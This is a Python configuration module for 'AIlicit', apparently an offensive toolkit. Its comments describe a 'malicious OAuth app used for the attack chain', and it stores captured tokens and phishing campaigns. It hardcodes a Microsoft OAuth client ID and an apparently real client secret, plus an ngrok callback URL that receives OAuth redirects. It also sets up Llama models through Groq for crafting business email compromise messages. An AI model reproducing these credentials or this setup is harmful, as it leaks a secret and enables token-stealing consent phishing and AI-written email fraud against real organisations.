"""Shared constants and default paths for AIlicit.

Every value can be overridden via environment variable where noted.
Runtime data files live in the repository's ``data/`` directory.
"""

import os

# ------------------------------------------------------------------
# Repository layout (data files live outside the package)
# ------------------------------------------------------------------
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR = os.path.join(REPO_ROOT, "data")

os.makedirs(DATA_DIR, exist_ok=True)

# ------------------------------------------------------------------
# Microsoft OAuth app (malicious OAuth app used for the attack chain)
# ------------------------------------------------------------------
CLIENT_ID = os.getenv("OAUTH_CLIENT_ID", "9aa62102-7d9a-45b0-91f3-e8965341dbc7")
CLIENT_SECRET = os.getenv("OAUTH_CLIENT_SECRET", "URR8Q~dc0CuHSf_GeV4V1547~tkXuQT1EE6apcKI")
REDIRECT_URI = os.getenv(
    "OAUTH_REDIRECT_URI",
    "https://a91c-128-197-28-178.ngrok-free.app/oauth/callback",
)

# ------------------------------------------------------------------
# Groq API (Llama models for BEC analysis & crafting)
# ------------------------------------------------------------------
GROQ_API_KEY = os.getenv("GROQ_API_KEY", "")
GROQ_ENDPOINT = "https://api.groq.com/openai/v1/chat/completions"
SCOUT_MODEL = "meta-llama/llama-4-scout-17b-16e-instruct"
MAVERICK_MODEL = "llama-3.3-70b-versatile"

# ------------------------------------------------------------------
# Default data file locations
# ------------------------------------------------------------------
TOKEN_FILE = os.getenv("TOKEN_FILE", os.path.join(DATA_DIR, "tokens.json"))
CAMPAIGN_FILE = os.getenv("CAMPAIGN_FILE", os.path.join(DATA_DIR, "campaigns.json"))
CAPTURE_FILE = os.getenv("CAPTURE_FILE", os.path.join(DATA_DIR, "captured_tokens.txt"))
